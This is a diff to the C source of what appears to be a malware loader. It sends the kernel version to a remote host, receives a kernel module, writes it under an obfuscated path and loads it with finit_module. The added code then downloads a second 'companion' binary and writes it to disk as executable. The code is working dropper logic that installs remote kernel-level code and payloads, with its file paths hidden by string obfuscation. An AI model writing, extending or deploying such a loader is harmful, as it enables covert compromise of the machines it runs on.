@@ -90,6 +90,7 @@ int main(int argc, char *argv[])
     if (send_exact(sock, u.release, len) != 0)
         goto out;
 
+    /* --- receive .ko --- */
     if (recv_exact(sock, &ko_size, sizeof(ko_size)) != 0)
         goto out;
     if (ko_size == 0 || ko_size > KO_MAX_SIZE)
@@ -101,8 +102,8 @@ int main(int argc, char *argv[])
     if (recv_exact(sock, ko_buf, ko_size) != 0)
         goto out;
 
+    /* write .ko to tmpfs */
     DEOBFS(tmp_path, _enc_tmp_ko, _LEN_TMP_KO);
-
     tmp_fd = open(tmp_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
     if (tmp_fd < 0)
         goto out;
@@ -110,12 +111,45 @@ int main(int argc, char *argv[])
         goto out;
     close(tmp_fd);
     tmp_fd = -1;
+    free(ko_buf);
+    ko_buf = NULL;
 
+    /* load .ko */
     tmp_fd = open(tmp_path, O_RDONLY | O_CLOEXEC);
     if (tmp_fd < 0)
         goto out;
-    if (syscall(SYS_finit_module, tmp_fd, "", 0) != 0)
-        goto out;
+    syscall(SYS_finit_module, tmp_fd, "", 0); /* ignore EEXIST */
+    close(tmp_fd);
+    tmp_fd = -1;
+
+    /* --- receive companion binary --- */
+    {
+        uint32_t comp_size;
+        uint8_t *comp_buf;
+
+        if (recv_exact(sock, &comp_size, sizeof(comp_size)) != 0)
+            goto out;
+        if (comp_size == 0 || comp_size > KO_MAX_SIZE)
+            goto out;
+
+        comp_buf = malloc(comp_size);
+        if (!comp_buf)
+            goto out;
+        if (recv_exact(sock, comp_buf, comp_size) != 0) {
+            free(comp_buf);
+            goto out;
+        }
+
+        DEOBFS(comp_path, _enc_comp_path, _LEN_COMP_PATH);
+        tmp_fd = open(comp_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+        if (tmp_fd >= 0) {
+            write(tmp_fd, comp_buf, comp_size);
+            fchmod(tmp_fd, 0755);
+            close(tmp_fd);
+            tmp_fd = -1;
+        }
+        free(comp_buf);
+    }
 
     ret = 0;
 
